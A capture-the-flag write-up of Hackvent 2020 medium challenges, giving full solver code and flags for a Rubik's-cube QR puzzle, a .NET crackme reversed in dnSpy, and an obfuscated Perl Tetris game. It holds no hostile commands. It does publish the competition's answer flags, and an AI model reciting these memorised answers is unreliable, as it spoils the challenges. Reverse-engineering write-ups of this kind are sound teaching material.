# Hackvent 2020 - Medium

[ctf](/tags#ctf ) [hackvent](/tags#hackvent ) [rubiks](/tags#rubiks )
[py222](/tags#py222 ) [python-pil](/tags#python-pil )
[scrambles](/tags#scrambles ) [python](/tags#python ) [dnspy](/tags#dnspy )
[perl](/tags#perl ) [obfuscation](/tags#obfuscation ) [ssti](/tags#ssti )
[jinja2](/tags#jinja2 ) [flask](/tags#flask ) [werkzeug-debug](/tags#werkzeug-
debug ) [colb](/tags#colb ) [networkx](/tags#networkx ) [graphs](/tags#graphs
) [cliques](/tags#cliques ) [mobilefish](/tags#mobilefish ) [rsa](/tags#rsa )
[crypto](/tags#crypto ) [wiener](/tags#wiener ) [mpz](/tags#mpz )  
  
Jan 1, 2021

  * [Hackvent 2020  
easy](/hackvent2020/easy)

  * medium
  * [hard](/hackvent2020/hard)
  * [leet(ish)](/hackvent2020/leet)

![](https://0xdfimages.gitlab.io/img/hackvent2020-medium-cover.png)

Medium continues with another seven challenges over seven days. There’s a
really good crypto challenge involving recovering RSA parameters recovered
from a PCAP file and submitted to a Wiener attack, web hacking through an
server-side template injection, dotNet reversing, a Rubik’s cube challenge,
and what is becoming the annual obfuscated Perl game.

## HV20.06

### Challenge

![hv20-ball06](https://0xdfimages.gitlab.io/img/hv20-ball06.png) | HV20.06 Twelve steps of christmas  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN   
Level: | medium  
Author: |  [Bread](https://twitter.com/nonsxd)  
  
> On the sixth day of Christmas my true love sent to me…
>
> six valid QRs, five potential scrambles, four orientation bottom and right,
> and the rest has been said previously.

![img](https://0xdfimages.gitlab.io/img/9a96751d-16db-45db-
ae61-ecd83ca67dab.png)

There’s also two hints:

  * selbmarcs
  * The black lines are important - do not remove them

### Solution

#### What’s Going On

The first challenge here is to figure out what this challenge is. The image is
a 2x2 Rubix cube with QR codes on each side, and it’s currently scrambled.
I’ve got five scrambles, which a series of moves written in a custom notation
as described [here](https://ruwix.com/the-rubiks-cube/notation/). Then there’s
the hint, selbmarcs. That’s just scambles backwards. Typically a scramble is
applied to a clean cube to mess it up for someone else to solve. Given that
this cube is already scrambed, I’d need to apply the scrambles backwards to
solve it and get it back to where I can read the QRCodes.

#### Import Images

If I’m going to recreate these codes in Python, I need to be able to read the
images in. Looking at the image in Gimp, each quarter QRCode is 93 pixels
square. This function will crop four little squares given the top left
coordinate:

    
    
    def four_squares(letter, x, y):
        squares[letter] = main.crop((x, y, x + sq_size, y + sq_size))
        squares[chr(ord(letter) + 1)] = main.crop(
            (x + sq_size, y, x + 2 * sq_size, y + sq_size)
        ).rotate(90)
        squares[chr(ord(letter) + 2)] = main.crop(
            (x, y + sq_size, x + sq_size, y + 2 * sq_size)
        ).rotate(-90)
        squares[chr(ord(letter) + 3)] = main.crop(
            (x + sq_size, y + sq_size, x + 2 * sq_size, y + 2 * sq_size)
        ).rotate(180)
    

The images are saved indexed by letter in the following pattern:

    
    
          ┌──┬──┐
          │ a│ b│
          ├──┼──┤
          │ c│ d│
    ┌──┬──┼──┼──┼──┬──┬──┬──┐
    │ q│ r│ i│ j│ e│ f│ u│ v│
    ├──┼──┼──┼──┼──┼──┼──┼──┤
    │ s│ t│ k│ l│ g│ h│ w│ x│
    └──┴──┼──┼──┼──┴──┴──┴──┘
          │ m│ n│
          ├──┼──┤
          │ o│ p│
          └──┴──┘
    

It also rotates each square so that the marker from the outside corner is at
the top left. That way, when I’m reassembling images later, I’ll just have to
re-rotate them based on the position they are in, instead of trying to figure
out how they are currently and how much rotation is needed.

Calling that function six times will read all 24 small squares into the dict:

    
    
    squares = {}
    sq_size = 93  # pixels
    
    main = Image.open("9a96751d-16db-45db-ae61-ecd83ca67dab.png")
    four_squares("a", 250, 44)
    four_squares("q", 62, 232)
    four_squares("i", 250, 232)
    four_squares("e", 438, 232)
    four_squares("u", 626, 232)
    four_squares("m", 250, 420)
    

#### Find Correct Scramble

I need a way to try each of the five scrambles and see what each one returns.
My thinking (or hope) is that only one will return a valid cube with valid
QRCodes on each side, and I’ll start with valid just being that it has three
big markers and one small marker, not worrying about orientation. I used
[py222](https://github.com/MeepMoop/py222) to do the moves. In `py222`, the
state of a cube is just a NumPy array. So I created an array that was just 1
if the square contained the big black/white/black box or 0 if not:

    
    
    sq_type = np.array(
        [1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0]
    )
    

The order is the same as the image above with letters:

    
    
          ┌──┬──┐            
          │ 1│ 1│
          ├──┼──┤
          │ 1│ 0│
    ┌──┬──┼──┼──┼──┬──┬──┬──┐
    │ 1│ 0│ 0│ 1│ 1│ 1│ 1│ 1│                                                
    ├──┼──┼──┼──┼──┼──┼──┼──┤
    │ 1│ 0│ 1│ 1│ 1│ 1│ 0│ 0│
    └──┴──┼──┼──┼──┴──┴──┴──┘
          │ 1│ 1│
          ├──┼──┤            
          │ 1│ 1│            
          └──┴──┘ 
    

Code the scrambles:

    
    
    scrambles = [
        "D' R2 F B2 R L2 B2 R2 B' L2",
        "U' D' F2 B2 D B' U2 D F R'",
        "F2 R2 D' U2 L' B2 R D' F L'",
        "B2 L U' B R2 U D' F2 R' B'",
        "U F2 U' D' L2 R D' L2 D R",
    ]
    

As well as a function that reverses the moves:

    
    
    def undo(scram):
        res = ""
        for s in scram.split(" ")[::-1]:
            if "'" in s:
                res += s[0]
            elif "2" in s:
                res += s
            else:
                res += s + "'"
            res += " "
        return res.strip()
    

Now in a loop I’ll try each scramble and see if the resulting cube has three 1
and one 0 on each side:

    
    
    for scram in scrambles:
        res = py222.doAlgStr(sq_type, undo(scram))
        if all([sum(x) == 3 for x in np.split(res, 6)]):
            solution = scram
            print(f"[+] Found scramble that results in 6 good QRcodes:")
            py222.printCube(res)
    

Fortunately for me, only one scramble meets that criteria.

Now I can take an initial cube that has letters a-z in the order I showed at
the top, and run the reverse of the solution scramble to get the original
cube:

    
    
    print("[*] Solving with lettered blocks")
    sqs = np.array(list(string.ascii_lowercase))
    print('[*] Starting cube')
    py222.printCube(sqs)
    final_cube = py222.doAlgStr(sqs, undo(solution))
    print("[+] Identified cube with 6 valid QR codes")
    py222.printCube(final_cube)
    

#### Generate Flag

I’ll make another function that takes four letters representing squares that
were read in earlier and generates a QR image from them:

    
    
    def create_qr(sqs):
        new_im = Image.new("L", (sq_size * 2, sq_size * 2))
        new_im.paste(squares[sqs[0]], (0, 0))
        new_im.paste(squares[sqs[1]].rotate(-90), (sq_size, 0))
        new_im.paste(squares[sqs[2]].rotate(90), (0, sq_size))
        new_im.paste(squares[sqs[3]].rotate(180), (94, 94))
        return new_im
    

Rotations are applied based on where they are in the new image because the
orientations were normalized on reading them in.

Now loop through the sides and print the value of the QR:

    
    
    print("[*] Decoding QR Codes\n[+] Flag:")
    for code in sorted(["".join(x) for x in np.split(final_cube, 6)]):
        qr_code = create_qr(code)
        barcode = decode(qr_code)
        print(barcode[0].data.decode().strip())
    

Each QR puts out 1/6th of the flag. To be overly neat about it, I’ll add a
sort order so I can print the full flag (there’s no way I could have known
that order before looking at the output):

    
    
    print("[*] Decoding QR Codes\n[+] Flag:")
    sort_order = lambda c: "qelnof".index(c[0])
    for code in sorted(["".join(x) for x in np.split(final_cube, 6)], key=sort_order):
        qr_code = create_qr(code)
        barcode = decode(qr_code)
        print(barcode[0].data.decode().strip(), end="")
    print()
    

#### Final Script

All of this together makes:

    
    
    #!/usr/bin/env python3
    
    import numpy as np
    import py222
    import string
    from PIL import Image
    from pyzbar.pyzbar import decode
    
    
    def undo(scram):
        res = ""
        for s in scram.split(" ")[::-1]:
            if "'" in s:
                res += s[0]
            elif "2" in s:
                res += s
            else:
                res += s + "'"
            res += " "
        return res.strip()
    
    
    def four_squares(letter, x, y):
        squares[letter] = main.crop((x, y, x + sq_size, y + sq_size))
        squares[chr(ord(letter) + 1)] = main.crop(
            (x + sq_size, y, x + 2 * sq_size, y + sq_size)
        ).rotate(90)
        squares[chr(ord(letter) + 2)] = main.crop(
            (x, y + sq_size, x + sq_size, y + 2 * sq_size)
        ).rotate(-90)
        squares[chr(ord(letter) + 3)] = main.crop(
            (x + sq_size, y + sq_size, x + 2 * sq_size, y + 2 * sq_size)
        ).rotate(180)
    
    
    def create_qr(sqs):
        new_im = Image.new("L", (sq_size * 2, sq_size * 2))
        new_im.paste(squares[sqs[0]], (0, 0))
        new_im.paste(squares[sqs[1]].rotate(-90), (sq_size, 0))
        new_im.paste(squares[sqs[2]].rotate(90), (0, sq_size))
        new_im.paste(squares[sqs[3]].rotate(180), (94, 94))
        return new_im
    
    
    squares = {}
    sq_size = 93  # pixels
    
    main = Image.open("9a96751d-16db-45db-ae61-ecd83ca67dab.png")
    four_squares("a", 250, 44)
    four_squares("q", 62, 232)
    four_squares("i", 250, 232)
    four_squares("e", 438, 232)
    four_squares("u", 626, 232)
    four_squares("m", 250, 420)
    
    print(f"[+] Collected {len(squares)} square images")
    
    scrambles = [
        "D' R2 F B2 R L2 B2 R2 B' L2",
        "U' D' F2 B2 D B' U2 D F R'",
        "F2 R2 D' U2 L' B2 R D' F L'",
        "B2 L U' B R2 U D' F2 R' B'",
        "U F2 U' D' L2 R D' L2 D R",
    ]
    
    sq_type = np.array(
        [1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0]
    )
    
    for scram in scrambles:
        res = py222.doAlgStr(sq_type, undo(scram))
        if all([sum(x) == 3 for x in np.split(res, 6)]):
            solution = scram
            print(f"[+] Found scramble that results in 6 good QRcodes:")
            py222.printCube(res)
    
    print("[*] Solving with lettered blocks")
    sqs = np.array(list(string.ascii_lowercase))
    print('[*] Starting cube')
    py222.printCube(sqs)
    final_cube = py222.doAlgStr(sqs, undo(solution))
    print("[+] Identified cube with 6 valid QR codes")
    py222.printCube(final_cube)
    
    print("[*] Decoding QR Codes\n[+] Flag:")
    sort_order = lambda c: "qelnof".index(c[0])
    for code in sorted(["".join(x) for x in np.split(final_cube, 6)], key=sort_order):
        qr_code = create_qr(code)
        barcode = decode(qr_code)
        print(barcode[0].data.decode().strip(), end="")
    print()
    

Running it solves the challenge:

    
    
    $ python3 solver.py 
    [+] Collected 24 square images
          ┌──┬──┐
          │ 1│ 1│
          ├──┼──┤
          │ 1│ 0│
    ┌──┬──┼──┼──┼──┬──┬──┬──┐
    │ 1│ 0│ 0│ 1│ 1│ 1│ 1│ 1│
    ├──┼──┼──┼──┼──┼──┼──┼──┤
    │ 1│ 0│ 1│ 1│ 1│ 1│ 0│ 0│
    └──┴──┼──┼──┼──┴──┴──┴──┘
          │ 1│ 1│
          ├──┼──┤
          │ 1│ 1│
          └──┴──┘
    [+] Found scramble that results in 6 good QRcodes:
          ┌──┬──┐
          │ 1│ 1│
          ├──┼──┤
          │ 1│ 0│
    ┌──┬──┼──┼──┼──┬──┬──┬──┐
    │ 1│ 1│ 1│ 1│ 1│ 1│ 1│ 1│
    ├──┼──┼──┼──┼──┼──┼──┼──┤
    │ 1│ 0│ 1│ 0│ 1│ 0│ 1│ 0│
    └──┴──┼──┼──┼──┴──┴──┴──┘
          │ 1│ 1│
          ├──┼──┤
          │ 1│ 0│
          └──┴──┘
    [*] Solving with lettered blocks
    [*] Starting cube
          ┌──┬──┐
          │ a│ b│
          ├──┼──┤
          │ c│ d│
    ┌──┬──┼──┼──┼──┬──┬──┬──┐
    │ q│ r│ i│ j│ e│ f│ u│ v│
    ├──┼──┼──┼──┼──┼──┼──┼──┤
    │ s│ t│ k│ l│ g│ h│ w│ x│
    └──┴──┼──┼──┼──┴──┴──┴──┘
          │ m│ n│
          ├──┼──┤
          │ o│ p│
          └──┴──┘
    [+] Identified cube with 6 valid QR codes
          ┌──┬──┐
          │ n│ u│
          ├──┼──┤
          │ a│ d│
    ┌──┬──┼──┼──┼──┬──┬──┬──┐
    │ l│ v│ q│ j│ e│ b│ f│ g│
    ├──┼──┼──┼──┼──┼──┼──┼──┤
    │ p│ x│ s│ t│ k│ r│ c│ w│
    └──┴──┼──┼──┼──┴──┴──┴──┘
          │ o│ m│
          ├──┼──┤
          │ h│ i│
          └──┴──┘
    [*] Decoding QR Codes
    [+] Flag:
    HV20{Erno_Rubik_would_be_proud.Petrus_is_Valid.#HV20QRubicsChal}
    

**Flag:`HV20{Erno_Rubik_would_be_proud.Petrus_is_Valid.#HV20QRubicsChal}`**

#### Brute Force Alternative

Before I found `py222`, I considered another way to solve this challenge just
brute forcing all possible combinations of three big squares and one little
square. Once I had the script above, it wasn’t too difficult to modify it to
try this approach and see it also worked.

I’ll modify the `four_square` function that reads in the squares to also take
an indicator as to which kind of square it is, and store the results in two
lists instead of one.

Then loop over permutations of big squares and permutations of little squares
and print anything that produces a valid barcode with valid data:

    
    
    #!/usr/bin/env python3
    
    from itertools import permutations
    from PIL import Image
    from pyzbar.pyzbar import decode
    
    
    def four_squares(x, y, big):
        squares[big[0]].append(main.crop((x, y, x + sq_size, y + sq_size)))
        squares[big[1]].append(main.crop(
            (x + sq_size, y, x + 2 * sq_size, y + sq_size)
        ).rotate(90))
        squares[big[2]].append(main.crop(
            (x, y + sq_size, x + sq_size, y + 2 * sq_size)
        ).rotate(-90))
        squares[big[3]].append(main.crop(
            (x + sq_size, y + sq_size, x + 2 * sq_size, y + 2 * sq_size)
        ).rotate(180))
    
    
    def create_qr(im1, im2, im3, im4):
        new_im = Image.new("L", (sq_size * 2, sq_size * 2))
        new_im.paste(im1, (0, 0))
        new_im.paste(im2.rotate(-90), (sq_size, 0))
        new_im.paste(im3.rotate(90), (0, sq_size))
        new_im.paste(im4.rotate(180), (94, 94))
        return new_im
    
    squares = [[], []]
    little_marker_sqs = {}
    sq_size = 93  # pixels
    
    main = Image.open("9a96751d-16db-45db-ae61-ecd83ca67dab.png")
    four_squares(250, 44, [1,1,1,0])
    four_squares(62, 232, [1,0,1,0])
    four_squares(250, 232, [0,1,1,1])
    four_squares(438, 232, [1,1,1,1])
    four_squares(626, 232, [1,1,0,0])
    four_squares(250, 420, [1,1,1,1])
    
    print(f"[+] Collected square images")
    
    
    for perm in permutations(squares[1], 3):
        for little in squares[0]:
            qr_code = create_qr(perm[0], perm[1], perm[2], little)
            barcode = decode(qr_code)
            if barcode:
                print(barcode[0].data.decode().strip())
    

Running this returns the flag pieces and nothing else in about three minutes:

    
    
    $ time python3 solver-brute.py 
    [+] Collected square images
    HV20{Erno_
    _be_proud.
    Rubik_would
    #HV20QRubicsChal}
    Petrus_is
    _Valid.
    
    real    3m10.619s
    user    3m10.138s
    sys     0m0.104s
    

## HV20.07

### Challenge

![hv20-ball07](https://0xdfimages.gitlab.io/img/hv20-ball07.png) | HV20.07 Bad morals  
---|---  
Categories: |  ![programming](../img/hv-cat-programming.png)PROGRAMMING  
![reverse engineering](../img/hv-cat-reverse_engineering.png)REVERSE
ENGINEERING  
Level: | medium  
Author: |  kuyaya   
  
> One of the elves recently took a programming 101 course. Trying to be
> helpful, he implemented a program for Santa to generate all the flags for
> him for this year’s HACKvent 2020. The problem is, he can’t remember how to
> use the program any more and the link to the documentation just says `404
> Not found`. I bet he learned that in the Programming 101 class as well.
>
> Can you help him get the flag back?
>
> [BadMorals.exe](/files/cc1b4db7-d5b6-48b8-bee5-8dcba508bf81.exe)

The file is a 32-bit .NET executable:

    
    
    $ file cc1b4db7-d5b6-48b8-bee5-8dcba508bf81.exe 
    cc1b4db7-d5b6-48b8-bee5-8dcba508bf81.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
    

### Solution

#### Run It

Running the executable offers three prompts, and then it reports that it
failed:

    
    
    PS > .\cc1b4db7-d5b6-48b8-bee5-8dcba508bf81.exe
    Your first input: test
    Your second input: test
    Your third input: test
    Please try again.
    Press enter to exit.
    

#### Reversing

Given it’s a .NET executable, I’ll open it in
[DNSpy](https://github.com/dnSpy/dnSpy). There’s a single `main` function that
performs a series of checks.

The first check is based on the first input:

    
    
    public static void Main(string[] args)
    {
    	try
    	{
    		Console.Write("Your first input: ");
    		char[] array = Console.ReadLine().ToCharArray();
    		string text = "";
    		for (int i = 0; i < array.Length; i++)
    		{
    			if (i % 2 == 0 && i + 2 <= array.Length)
    			{
    				text += array[i + 1].ToString();
    			}
    		}
    		string str;
    		if (text == "BumBumWithTheTumTum")
    		{
    			str = string.Concat(new object[]
    			{
    				"SFYyMH",
    				array[17].ToString(),
    				"yMz",
    				array[8].GetHashCode() % 10,
    				"zcnMzXzN",
    				array[3].ToString(),
    				"ZzF",
    				array[9].ToString(),
    				"MzNyM",
    				array[13].ToString(),
    				"5n",
    				array[14].ToString(),
    				"2"
    			});
    		}
    		else
    		{
    			if (text == "")
    			{
    				Console.WriteLine("Your input is not allowed to result in an empty string");
    				return;
    			}
    			str = text;
    		}
    

First, it takes input and copies every odd character into a string, and
compares that to “BumBumWithTheTumTum”. It will accept any any characters in
the even indexes. If succeeds, it’ll build a string in `str` based on some
static strings and that input. I’ll come back to this later.

The next check is based on the second input:

    
    
    		Console.Write("Your second input: ");
    		char[] array2 = Console.ReadLine().ToCharArray();
    		text = "";
    		Array.Reverse(array2);
    		for (int j = 0; j < array2.Length; j++)
    		{
    			text += array2[j].ToString();
    		}
    		string s;
    		if (text == "BackAndForth")
    		{
    			s = string.Concat(new string[]
    			{
    				"Q1RGX3",
    				array2[11].ToString(),
    				"sNH",
    				array2[8].ToString(),
    				"xbm",
    				array2[5].ToString(),
    				"f"
    			});
    		}
    		else
    		{
    			if (text == "")
    			{
    				Console.WriteLine("Your input is not allowed to result in an empty string");
    				return;
    			}
    			s = text;
    		}
    

This time the entire input is reversed, and the compared to “BackAndForth”.
Similar to the last check, this time it builds another string, `s`. The
necessary input is “htroFdnAkcaB”.

The third check is based on the third input:

    
    
    		Console.Write("Your third input: ");
    		char[] array3 = Console.ReadLine().ToCharArray();
    		text = "";
    		byte b = 42;
    		for (int k = 0; k < array3.Length; k++)
    		{
    			char c = array3[k] ^ (char)b;
    			b = (byte)((int)b + k - 4);
    			text += c.ToString();
    		}
    		string str2;
    		if (text == "DinosAreLit")
    		{
    			str2 = string.Concat(new string[]
    			{
    				"00ZD",
    				array3[3].ToString(),
    				"f",
    				array3[2].ToString(),
    				"zRzeX0="
    			});
    		}
    		else
    		{
    			if (text == "")
    			{
    				Console.WriteLine("Your input is not allowed to result in an empty string");
    				return;
    			}
    			str2 = text;
    		}
    

This time there is an xor against the input byte by byte, and the result
should be “DinosAreLit”. The first byte is xored by 42, and then that value is
decremented by four and increased by the current index. Following that
pattern, the xor keys will be `[42, 38, 35, 33, 32, 32, 33, 35, 38, 42, 47]`.
I can use this in a Python terminal to get the needed input:

    
    
    >>> x = [42, 38, 35, 33, 32, 32, 33, 35, 38, 42, 47]
    >>> res = "DinosAreLit"
    >>> ''.join([chr(ord(c)^b) for c,b in zip(res, x)])
    'nOMNSaSFjC['
    

Based on the results matching, `str2` is built.

At this point it gets a bit less straight forward. `str` and `str2`, built on
successes in the first three gates, are concatenated and then base64-decoded.
`s` is also base64-decoded. The results are xored together, and then that
value is SHA1 hashed and compared against a static value. If it matches, the
flag is printed:

    
    
    		byte[] array4 = Convert.FromBase64String(str + str2);
    		byte[] array5 = Convert.FromBase64String(s);
    		byte[] array6 = new byte[array4.Length];
    		for (int l = 0; l < array4.Length; l++)
    		{
    			array6[l] = (array4[l] ^ array5[l % array5.Length]);
    		}
    		byte[] array7 = SHA1.Create().ComputeHash(array6);
    		byte[] array8 = new byte[]
    		{
    			107,
    ...[snip]...
    			10
    		};
    		for (int m = 0; m < array7.Length; m++)
    		{
    			if (array7[m] != array8[m])
    			{
    				Console.WriteLine("Your inputs do not result in the flag.");
    				return;
    			}
    		}
    		string @string = Encoding.ASCII.GetString(array4);
    		if (@string.StartsWith("HV20{"))
    		{
    			Console.WriteLine("Congratulations! You're now worthy to claim your flag: {0}", @string);
    		}
    	}
    	catch
    	{
    		Console.WriteLine("Please try again.");
    	}
    	finally
    	{
    		Console.WriteLine("Press enter to exit.");
    		Console.ReadLine();
    	}
    }
    

At this point, `str2` and `s` are fixed. All of `str` is as well, except for
two bytes which come from even indexed characters in the first input which
were not checked - 8 and 14. So `str` will be, with the two chars that are
undefined marked in `[]`:

    
    
    SFYyMHtyMz[8]zcnMzXzNuZzFuMzNyMW5n[14]200ZDNfMzRzeX0=
    

The character at 14 is just the index 14 character from the string entered in
the first prompt, whereas the one at 8 is actually `array[8].GetHashCode() %
10`. Double clicking the `GetHashCode` function in `DNSpy` displays the
definition:

    
    
    public override int GetHashCode()
    {
        return (int)(this | (int)this << 16);
    }
    

That’s simple enough. All the characters need to be in the base64 alphabet, so
the following script will find the valid inputs:

    
    
    #!/usr/bin/env python3
    
    import hashlib
    import string
    from base64 import b64decode
    from itertools import cycle
    
    
    base64_alpha = string.ascii_letters + string.digits + "+//"
    s = "Q1RGX3hsNHoxbmnf"
    s2 = b64decode(s)
    strs = "SFYyMHtyMz[8]zcnMzXzNuZzFuMzNyMW5n[14]200ZDNfMzRzeX0="
    
    for c1 in base64_alpha:
        for c2 in base64_alpha:
            c1_hashcode = f"{((ord(c1) << 16) | ord(c1)) % 10}"
            s1 = b64decode(strs.replace("[8]", c1_hashcode).replace("[14]", c2))
            array6 = b"".join([bytes([x1 ^ x2]) for x1, x2 in zip(s1, cycle(s2))])
            if (hashlib.sha1(array6).hexdigest() == "6b4077ca9adac8713f014294cf17fec6c54f150a"):
                print(f"c1: {c1} c2: {c2} flag: {s1.decode()}")
    

It loops over each combination of characters substituting them into the base64
string that’s built, and then taking the SHA1 hash and comparing it to the one
from the binary. When they match, it prints the characters input as well as
the value of `s1`, which happens to be the flag.

To get that SHA1 hash as a string, I copied the integer array out of `DNSpy`,
converting it to hex in Python:

    
    
    >>> x = [107, 64, 119, 202, 154, 218, 200, 113, 63, 1, 66, 148, 207, 23, 254, 198, 197, 79, 21, 10]
    >>> ''.join([f'{y:02x}' for y in x])
    '6b4077ca9adac8713f014294cf17fec6c54f150a'
    

The script works, and it turns out there are several options that make the
same flag:

    
    
    $ python3 decode.py 
    c1: h c2: X flag: HV20{r3?3rs3_3ng1n33r1ng_m4d3_34sy}
    c1: r c2: X flag: HV20{r3?3rs3_3ng1n33r1ng_m4d3_34sy}
    c1: J c2: X flag: HV20{r3?3rs3_3ng1n33r1ng_m4d3_34sy}
    c1: T c2: X flag: HV20{r3?3rs3_3ng1n33r1ng_m4d3_34sy}
    c1: 6 c2: X flag: HV20{r3?3rs3_3ng1n33r1ng_m4d3_34sy}
    

**Flag:`HV20{r3?3rs3_3ng1n33r1ng_m4d3_34sy}`**

How can different characters input make the same base64 decoded output. It’s
the `GetHashCode()` call:

    
    
    >>> for x in 'hrJT6':
    ...     f"{((ord(x) << 16) | ord(x)) % 10}"
    ... 
    '8'
    '8'
    '8'
    '8'
    '8'
    

## HV20.08

### Challenge

![hv20-ball08](https://0xdfimages.gitlab.io/img/hv20-ball08.png) | HV20.08 The game  
---|---  
Categories: |  ![fun](../img/hv-cat-fun.png)FUN  
![reverse engineering](../img/hv-cat-reverse_engineering.png)REVERSE
ENGINEERING  
Level: | medium  
Author: |  M.   
  
> Let’s play another little game this year. Once again, as every year, I
> promise it is hardly obfuscated.

There is also [this perl
script](/files/1456c098-0318-4370-ae1f-c4f6e51e2d50.txt).

### Solution

#### The Game

I’ll run the game with `perl 1456c098-0318-4370-ae1f-c4f6e51e2d50.txt`, and it
creates a version of Tetris in the terminal:

![image-20201208072553295](https://0xdfimages.gitlab.io/img/image-20201208072553295.png)

The blocks have characters in them, and at first they are all `#`, but then
other characters start to show, `H`, and later `V`, and then `{`, so it seems
like the flag comes in the blocks. I can play, but it’s hard because the
controls aren’t super responsive.

#### Deobfuscate

Every year there seems to be an obfuscated Perl game from M.
([2018](/hackvent2018/#day-7), [2019](/hackvent2019/medium#day-14)). The first
step is to deobfuscate it. It starts with two `eval` statements:

    
    
    eval eval '"'.
    ('['^'.').('['^'(').('`'|'%').('{'^'[').('{'^'/').('`'|'%').('['^')').('`'|'-').':'.':'.('{'^')').('`'|'%').('`'|'!').('`'|'$').('`'^'+').('`'|'%').('['^'"').';'.('{'^')').('`'|'%').('`'|'!').('`'|'$').('`'^'-').('`'|'/').('`'|'$').('`'|'%').('{'^"\[").(
    '^'^('`'|'+')).';'.'\\'.'$'.'|'.'='.('^'^('`'|'/')).';'.('['^'+').('['^')').('`'|')').('`'|'.').('['^'/').'\\'.'"'.'\\'.'\\'.('`'|'%').('`'|'#').'\\'.'\\'.('`'|'%').'['.('^'^('`'|',')).('`'^'*').'\\'.'\\'.('`'|'%').'['.'?'.('^'^('`'|',')).('^'^('`'|'+'))
    .('`'|',').'\\'.'\\'.('`'|'%').'['.'?'.('^'^('`'|')')).('`'|',').'\\'.'\\'.('`'|'%').'['.('^'^('`'|'/')).';'.('^'^('`'|'/')).('`'^'(').'\\'.'\\'.('`'|'%').'['.('^'^('`'|'.')).';'.('^'^('`'|'.')).('['^')').'\\'.'"'.';'.'\\'.'@'.('`'^'&').('`'^'&').('=').(
    '['^'(').('['^'+').('`'|',').('`'|')').('['^'/').'/'.'/'.','."'".'#'.'#'.'#'.'#'.('`'^'(').'#'.('{'^'-').'#'.('^'^('`'|',')).'#'.('^'^('`'|'.')).'#'.'\\'.'{'.'#'.('`'|'(').'#'.('['^'/').'#'.('['^'/').'#'.('['^'+').'#'.('['^'(').'#'.':'.'#'.'/'.'#'.('/').
    '#'.('['^',').'#'.('['^',').'#'.('['^',').'#'.'.'.'#'.('['^'"').'#'.('`'|'/').'#'.('['^'.').'#'.('['^'/').'#'.('['^'.').'#'.('`'|'"').'#'.('`'|'%').'#'.'.'.'#'.('`'|'#').'#'.('`'|'/').'#'.('`'|'-').'#'.'/'.'#'.('['^',').'#'.('`'|'!').'#'.('['^'/')."\#".(
    '`'|"\#").
    

As `eval` takes a string and runs it as code, replacing the outside one with
`print` will print the code that would have been run by `eval`:

    
    
    use Term::ReadKey;ReadMode 5;$|=1;print"\ec\e[2J\e[?25l\e[?7l\e[1;1H\e[0;0r";@FF=split//,'####H#V#2#0#{#h#t#t#p#s#:#/#/#w#w#w#.#y#o#u#t#u#b#e#.#c#o#m#/#w#a#t#c#h#?#v#=#d#Q#w#4#w#9#W#g#X#c#Q#}####';@BB=(89,51,30,27,75,294);$w=11;$h=23;print("\e[1;1H\e[103m".(' 'x(2*$w+2))."\e[0m\r\n".(("\e[103m \e[0m".(' 'x(2*$w))."\e[103m \e[0m\r\n")x$h)."\e[103m".(' 'x(2*$w+2))."\e[2;1H\e[0m");sub bl{($b,$bc,$bcc,$x,$y)=@_;for$yy(0..2){for$xx(0..5){print("\e[${bcc}m\e[".($yy+$y+2).";".($xx+$x*2+2)."H${bc}")if((($b&(0b111<<($yy*3)))>>($yy*3))&(4>>($xx>>1)));}}}sub r{$_=shift;($_&4)<<6|($_&32)<<2|($_&256)>>2|($_&2)<<4|($_&16)|($_&128)>>4|($_&1)<<2|($_&8)>>2|($_&64)>>6;}sub _s{($b,$bc,$x,$y)=@_;for$yy(0..2){for$xx(0..5){substr($f[$yy+$y],($xx+$x),1)=$bc if(((($b & (0b111<<($yy*3)))>>($yy*3))&(4>>$xx)));}}$Q='QcXgWw9d4';@f=grep{/ /}@f;unshift @f,(" "x$w)while(@f<$h);p();}sub cb{$_Q='ljhc0hsA5';($b,$x,$y)=@_;for$yy(0..2){for$xx(0..2){return 1 if(((($b&(0b111<<($yy*3)))>>($yy*3))&(4>>$xx))&&(($yy+$y>=$h)||($xx+$x<0)||($xx+$x>=$w)||(substr($f[$yy+$y],($xx+$x),1) ne ' ')));}}}sub p{for$yy(0..$#f){print("\e[".($yy+2).";2H\e[0m");$_=$f[$yy];s/./$&$&/gg;print;}};sub k{$k='';$k.=$c while($c=ReadKey(-1));$k;};sub n{$bx=5;$by=0;$bi=int(rand(scalar @BB));$__=$BB[$bi];$_b=$FF[$sc];$sc>77&&$sc<98&&$sc!=82&&eval('$_b'."=~y#$Q#$_Q#")||$sc==98&&$_b=~s/./0/;$sc++;}@f=(" "x$w)x$h;p();n();while(1){$k=k();last if($k=~/q/);$k=substr($k,2,1);$dx=($k eq 'C')-($k eq 'D');$bx+=$dx unless(cb($__,$bx+$dx,$by));if($k eq 'A'){unless(cb(r($__),$bx,$by)){$__=r($__)}elsif(!cb(r($__),$bx+1,$by)){$__=r($__);$bx++}elsif(!cb(r($__),$bx-1,$by)){$__=r($__);$bx--};}bl($__,$_b,101+$bi,$bx,$by);select(undef,undef,undef,0.1);if(cb($__,$bx,++$by)){last if($by<2);_s($__,$_b,$bx,$by-1);n();}else{bl($__," ",0,$bx,$by-1);}}sleep(1);ReadMode 0;print"\ec";
    

`-MO=Deparse` will get a cleaned up version of the code:

    
    
    $ perl mod.pl > deobf.pl 
    $ perl -MO=Deparse deobf.pl > deparse.pl
    deobf.pl syntax OK
    

Now it’s much cleaner:

    
    
    use Term::ReadKey;
    ReadMode(5);
    $| = 1;
    print "\ec\e[2J\e[?25l\e[?7l\e[1;1H\e[0;0r";
    @FF = split(//, '####H#V#2#0#{#h#t#t#p#s#:#/#/#w#w#w#.#y#o#u#t#u#b#e#.#c#o#m#/#w#a#t#c#h#?#v#=#d#Q#w#4#w#9#W#g#X#c#Q#}####', 0);
    @BB = (89, 51, 30, 27, 75, 294);
    $w = 11;
    $h = 23;
    print "\e[1;1H\e[103m" . ' ' x (2 * $w + 2) . "\e[0m\r\n" . ("\e[103m \e[0m" . ' ' x (2 * $w) . "\e[103m \e[0m\r\n") x $h . "\e[103m" . ' ' x (2 * $w + 2) . "\e[2;1H\e[0m";
    sub bl {
        ($b, $bc, $bcc, $x, $y) = @_;
